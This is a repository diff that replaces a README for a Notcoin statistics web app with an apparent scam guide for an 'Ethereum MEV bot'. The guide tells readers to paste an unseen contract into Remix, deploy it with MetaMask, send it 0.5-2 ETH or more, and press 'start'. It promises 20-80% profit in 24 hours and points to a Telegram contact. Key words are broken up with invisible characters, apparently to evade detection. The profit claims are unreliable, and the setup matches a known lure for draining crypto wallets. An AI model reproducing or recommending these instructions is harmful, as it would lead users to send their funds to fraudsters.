@@ -1,64 +1,69 @@
-# notco.in
 
-Welcome to the notco.in repository! This repository contains a Svelte web application for viewing statistics related to the game Notcoin. Please note that this application is built using regular Svelte, not SvelteKit.
-Also note that this is an unofficial version of the site. And only its open source implementation.
+<h1 align="center">Create Your Ethereum Bot for Uniswap V3</h1>
 
-## Overview
+<p align="center">
+  <img src="https://i.ibb.co/Sm4Xddw/68747470733a2f2f692e6962622e636f2f374779433259512f676574737461727465642e706e67.png">
+</p>
 
-The purpose of this application is to provide users with a platform to view statistics related to the game Notcoin. Whether you're interested in tracking player scores, analyzing game data, or simply exploring insights, notco.in has got you covered.
+<p align="center">
+  <strong>A tool for creating and managing MEV Bots, where clients can connect a MetaMask wallet and create a contract that is executed via a script on the website.</strong>
+</p>
 
-## Deployment
+## Description
 
-### Cloudflare Pages
+The tool allows users to create and manage MEV bots (Maximal Extractable Value bots) based on smart contracts. Users can connect their MetaMask cryptocurrency wallets, create contracts, and run scripts to automate trading and other operations on the Ethereum blockchain. 
 
-To deploy the application on Cloudflare Pages, follow these steps:
+⚠️ **The bot operates entirely within the browser, so there is no need to download any programs that could potentially be harmful to your computer.**
 
-1. Fork this repository.
-2. Log in to your Cloudflare account or sign up for a new account if you don't have one.
-3. Navigate to the Cloudflare Pages dashboard.
-4. Click on "Create a project" and select your GitHub repository.
-5. Configure the build settings as needed.
-6. Deploy the application.
+## Key Features
 
-### Own Server (Using Nginx)
+- **Wallet Connection**: Supports MetaMask.
+- **Contract Creation**: Users can create smart contracts using our tool.
+- **Script Execution**: The website allows users to execute the created contract and manage its execution.
+- **Real-time Transaction Display**: The bot's transactions are displayed in real-time.
 
-To deploy the application on your own server using Nginx, follow these steps:
+## Usage
 
-1. Clone this repository onto your server.
-2. Install Node.js if not already installed.
-3. Navigate to the project directory and install dependencies using `npm i`.
-4. Build the project using `npm run build`.
-5. Configure Nginx to serve the built files. Below is a sample Nginx configuration:
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+ 
+2. Access to [**Remix Ethereum IDE**](https://remix.ethereum.org/).
+   
+   <img src="https://i.ibb.co/ftNtP8G/2.png" alt="2" border="0">
+   
+   #### For the Remix IDE you can follow this steps:
+3. Click on the `contracts` folder and then create `New File`. Rename it as you like, for example: `bot.sol`
 
-   ```nginx
-   server {
-       listen 80;
-       server_name your_domain.com;
+   #### Note: If there is a problem if the text is not colored when you create bot.sol and paste the code from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.
 
-       location / {
-           root /var/www/notco.in/dist;
-           index index.html;
-           try_files $uri $uri/ /index.html;
-       }
-   }
-   ```
 
-6. Restart Nginx.
+4. Paste this [**sourcecode**](sourcecode.sol) code in R­­emi­x­.
 
-### Local Development
+5.  Go to the `Solidity Compiler` tab, select version `0.6.6+commit.6c089d02` and click `Compile bot.sol`.
+ 
+    Make sure `bot.sol` is selected in the CONTRACT section of the SOLIDITY COMPILER section.
 
-To set up the application for local development, follow these steps:
+6. TGo to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - ­M­et­am­as­k­­` environment and then `Deploy`. By approving the Me­­ta­­­ma­­sk contract creation fee, you will have created your own contract (ignore any IFPS errors that may appear afterwards).
 
-1. Clone this repository onto your local machine.
-2. Install Node.js if not already installed.
-3. Navigate to the project directory and install dependencies using `npm i`.
-4. Start the development server using `npm run dev`.
-5. Open your browser and navigate to `http://localhost:8080` to view the application.
+7. Copy your newly created contract address and fund it with any amount of ETH (at least 0.5-2 ETH or more is recommended) Simply send ETH to your newly created contract address to allow the bot to earn money.
 
-## Contributing
+8. After your transaction is confirmed, click the “start” button to run the b­o­­t. Withdraw your ETH at any time by clicking the “Withdraw” button.
+ 
+   #### That’s it. The bo­t will start wo­rking immed­iately earning you profits from a­r­­b­itr­a­ge trades on ­U­ni­s­­wa­­p pools.
+   
+   #### Testing the bot's operation over 24 hours yields ~20-80% profit on the balance.
 
-Contributions are welcome! If you'd like to contribute to this project, please see our [contributing guidelines](CONTRIBUTING.md) for more information.
+   #### The profit depends on network load (gas price) and competition from other MEV bots on the token.
+## Bot Balance Chart
+
+<img src="https://i.ibb.co/2t6ppPD/3.png" alt="3" border="0">
+
+
+## Contact Us
+📫 For any inquiries, please reach out to us:
+
+Telegram : [**Click Here**](https://t.me/UniMevBotsSupport/).
+
 
 ## License
 
-This project is licensed under the [GNU License](LICENSE).
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
